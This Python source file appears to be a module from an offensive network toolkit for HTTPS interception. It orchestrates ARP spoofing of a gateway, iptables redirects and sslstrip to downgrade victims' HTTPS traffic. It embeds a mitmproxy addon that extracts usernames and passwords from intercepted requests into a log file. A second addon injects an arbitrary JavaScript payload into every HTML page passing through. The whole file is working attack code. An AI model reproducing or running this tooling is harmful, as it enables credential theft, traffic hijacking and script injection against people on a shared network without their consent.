"""
HTTPS Intercept Module — MitM proxy, SSLstrip, credential capture, and JS injection.
Orchestrates mitmproxy, sslstrip, and arpspoof for full HTTPS interception pipelines.
"""

import os
import subprocess
import tempfile
import threading
from typing import Optional

from shadowcypher.core.module import BaseModule
from shadowcypher.core.runner import runner
from shadowcypher.core.sanitize import validate_ip, validate_port, validate_interface


# ── mitmproxy inline addon: credential extraction ──

_CRED_ADDON = """
import mitmproxy.http
import re
import datetime

CRED_PATTERNS = [
    re.compile(r'(?:user(?:name)?|login|email)=([^&]+)', re.IGNORECASE),
    re.compile(r'(?:pass(?:word)?|passwd|pwd)=([^&]+)', re.IGNORECASE),
]

class CredCapture:
    def __init__(self, output_file):
        self.output_file = output_file

    def request(self, flow: mitmproxy.http.HTTPFlow):
        content = flow.request.get_text(strict=False) or ""
        query   = flow.request.query_string or ""
        combined = content + "&" + query

        creds = {}
        for pat in CRED_PATTERNS:
            for m in pat.finditer(combined):
                creds[pat.pattern] = m.group(1)

        if creds:
            ts = datetime.datetime.utcnow().isoformat()
            host = flow.request.pretty_host
            with open(self.output_file, "a") as f:
                f.write(f"[{ts}] {host}\\n")
                for k, v in creds.items():
                    f.write(f"  {k}: {v}\\n")
                f.write("\\n")

def start(output_file):
    return CredCapture(output_file)
"""

# ── mitmproxy inline addon: JavaScript injection ──

_JS_INJECT_ADDON = """
import mitmproxy.http

JS_PAYLOAD = {js_payload}

class JSInject:
    def response(self, flow: mitmproxy.http.HTTPFlow):
        ct = flow.response.headers.get("content-type", "")
        if "text/html" in ct:
            html = flow.response.get_text(strict=False) or ""
            tag = f"<script>{{JS_PAYLOAD}}</script>"
            html = html.replace("</body>", tag + "</body>")
            if "</body>" not in html:
                html += tag
            flow.response.set_text(html)

def start():
    return JSInject()
"""


class HTTPSIntercept(BaseModule):
    """Full HTTPS interception: proxy, SSLstrip, cred capture, JS injection."""

    def __init__(self):
        super().__init__(module_name="https_intercept")
        self._proxy_task_id: Optional[str] = None
        self._addon_file: Optional[str] = None

    # ── mitmproxy transparent proxy ──

    def start_proxy(self, listen_port: int = 8080, on_output=None) -> Optional[str]:
        """
        Launch mitmproxy in transparent mode on listen_port.
        Requires iptables redirect rules for transparent operation:
          iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port <listen_port>
          iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port <listen_port>
        """
        if not validate_port(listen_port):
            if on_output:
                on_output(f"[HTTPS_INTERCEPT] ERROR: invalid listen_port {listen_port}\n")
            return None

        args = [
            "mitmproxy",
            "--mode", "transparent",
            "--listen-port", str(listen_port),
            "--showhost",
        ]

        if on_output:
            on_output(f"[HTTPS_INTERCEPT] PROXY starting on :{listen_port} (transparent mode)\n")
            on_output("[HTTPS_INTERCEPT] Ensure iptables PREROUTING redirect rules are in place.\n")

        self.log(f"PROXY_START port={listen_port}")
        task_id = runner.execute_task("HTTPS_PROXY", args, callback=on_output)
        self._proxy_task_id = task_id
        self.active_tasks.append(task_id)
        return task_id

    # ── SSLstrip + ARP spoof ──

    def ssl_strip(self, interface: str, gateway_ip: str, on_output=None) -> Optional[str]:
        """
        Full ARP spoof + sslstrip pipeline:
        1. Enable IP forwarding
        2. arpspoof the gateway (so target's traffic routes through us)
        3. iptables redirect HTTP to sslstrip
        4. Launch sslstrip listener
        """
        if not validate_ip(gateway_ip):
            if on_output:
                on_output(f"[HTTPS_INTERCEPT] ERROR: invalid gateway_ip\n")
            return None

        if on_output:
            on_output(f"[HTTPS_INTERCEPT] SSL_STRIP: interface={interface} gateway={gateway_ip}\n")

        # Enable IP forwarding
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
        except PermissionError:
            if on_output:
                on_output("[HTTPS_INTERCEPT] WARNING: could not enable ip_forward (run as root)\n")

        # iptables redirect port 80 to sslstrip on 10000
        subprocess.run(
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp",
             "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False,
        )

        # ARP spoof gateway in background
        arp_task = runner.execute_task(
            "ARP_SPOOF",
            ["arpspoof", "-i", interface, gateway_ip],
            callback=on_output,
        )
        self.active_tasks.append(arp_task)

        # Launch sslstrip
        sslstrip_task = runner.execute_task(
            "SSLSTRIP",
            ["sslstrip", "-l", "10000", "-w", "/tmp/sslstrip.log"],
            callback=on_output,
        )
        self.active_tasks.append(sslstrip_task)
        self.log(f"SSL_STRIP on {interface} gateway={gateway_ip}")
        return sslstrip_task

    # ── Credential capture via mitmproxy addon ──

    def capture_creds(
        self,
        listen_port: int = 8080,
        output_file: str = "creds.log",
        on_output=None,
    ) -> Optional[str]:
        """
        Launch mitmproxy with a credential-extraction addon.
        Captured credentials are written to output_file.
        """
        if not validate_port(listen_port):
            if on_output:
                on_output(f"[HTTPS_INTERCEPT] ERROR: invalid listen_port\n")
            return None

        # Write addon to a temp file
        addon_path = os.path.join(tempfile.gettempdir(), "sc_cred_addon.py")
        with open(addon_path, "w") as f:
            f.write(_CRED_ADDON)
        self._addon_file = addon_path

        abs_output = os.path.abspath(output_file)
        args = [
            "mitmdump",
            "--mode", "transparent",
            "--listen-port", str(listen_port),
            "-s", addon_path,
            "--set", f"output_file={abs_output}",
        ]

        if on_output:
            on_output(f"[HTTPS_INTERCEPT] CRED_CAPTURE: proxy on :{listen_port}, "
                      f"writing to {abs_output}\n")

        self.log(f"CRED_CAPTURE port={listen_port} output={abs_output}")
        task_id = runner.execute_task("CRED_CAPTURE", args, callback=on_output)
        self._proxy_task_id = task_id
        self.active_tasks.append(task_id)
        return task_id

    # ── JS injection via mitmproxy addon ──

    def inject_js(
        self,
        listen_port: int = 8080,
        js_payload: str = "",
        on_output=None,
    ) -> Optional[str]:
        """
        Launch mitmproxy with a JS injection addon.
        js_payload is injected into every HTML response body before </body>.
        """
        if not validate_port(listen_port):
            if on_output:
                on_output(f"[HTTPS_INTERCEPT] ERROR: invalid listen_port\n")
            return None

        # Escape payload for embedding in Python source
        import json
        escaped = json.dumps(js_payload)
        addon_src = _JS_INJECT_ADDON.replace("{js_payload}", escaped)

        addon_path = os.path.join(tempfile.gettempdir(), "sc_js_inject_addon.py")
        with open(addon_path, "w") as f:
            f.write(addon_src)
        self._addon_file = addon_path

        args = [
            "mitmdump",
            "--mode", "transparent",
            "--listen-port", str(listen_port),
            "-s", addon_path,
        ]

        if on_output:
            on_output(f"[HTTPS_INTERCEPT] JS_INJECT: proxy on :{listen_port}\n")
            on_output(f"[HTTPS_INTERCEPT] Payload ({len(js_payload)} chars) will inject into HTML responses.\n")

        self.log(f"JS_INJECT port={listen_port}")
        task_id = runner.execute_task("JS_INJECT", args, callback=on_output)
        self._proxy_task_id = task_id
        self.active_tasks.append(task_id)
        return task_id

    # ── CA certificate generation ──

    @staticmethod
    def generate_ca(on_output=None) -> Optional[str]:
        """
        Generate mitmproxy's CA certificate by launching mitmdump once.
        The cert lands in ~/.mitmproxy/mitmproxy-ca-cert.pem by default.
        Returns the path to the generated CA cert, or None on failure.
        """
        ca_dir = os.path.expanduser("~/.mitmproxy")
        ca_cert = os.path.join(ca_dir, "mitmproxy-ca-cert.pem")

        if os.path.exists(ca_cert):
            if on_output:
                on_output(f"[HTTPS_INTERCEPT] CA already exists: {ca_cert}\n")
            return ca_cert

        if on_output:
            on_output("[HTTPS_INTERCEPT] GENERATE_CA: running mitmdump to create CA...\n")

        try:
            # mitmdump --version triggers CA generation and exits quickly
            result = subprocess.run(
                ["mitmdump", "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                timeout=30,
            )
            if on_output:
                on_output(result.stdout)
        except (FileNotFoundError, subprocess.TimeoutExpired) as e:
            if on_output:
                on_output(f"[HTTPS_INTERCEPT] ERROR: {e}\n")
            return None

        if os.path.exists(ca_cert):
            if on_output:
                on_output(f"[HTTPS_INTERCEPT] CA generated: {ca_cert}\n")
                on_output("Deploy with: sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem "
                          "/usr/local/share/ca-certificates/mitmproxy.crt && sudo update-ca-certificates\n")
            return ca_cert

        if on_output:
            on_output(f"[HTTPS_INTERCEPT] CA not found at expected path {ca_cert}\n")
        return None

    # ── Stop proxy ──

    def stop_proxy(self, on_output=None) -> None:
        """Kill the active mitmproxy/mitmdump process and clean up addon files."""
        if self._proxy_task_id:
            runner.stop_task(self._proxy_task_id)
            if on_output:
                on_output(f"[HTTPS_INTERCEPT] Stopped proxy task {self._proxy_task_id}\n")
            self._proxy_task_id = None

        # Cleanup temp addon files
        for path in [
            os.path.join(tempfile.gettempdir(), "sc_cred_addon.py"),
            os.path.join(tempfile.gettempdir(), "sc_js_inject_addon.py"),
        ]:
            try:
                os.remove(path)
            except FileNotFoundError:
                pass

        # pkill any lingering mitmdump processes
        subprocess.run(
            ["pkill", "-f", "mitmdump"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        )
        subprocess.run(
            ["pkill", "-f", "sslstrip"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        )

        self.log("STOP_PROXY: all intercept processes terminated")
        if on_output:
            on_output("[HTTPS_INTERCEPT] Proxy stopped.\n")
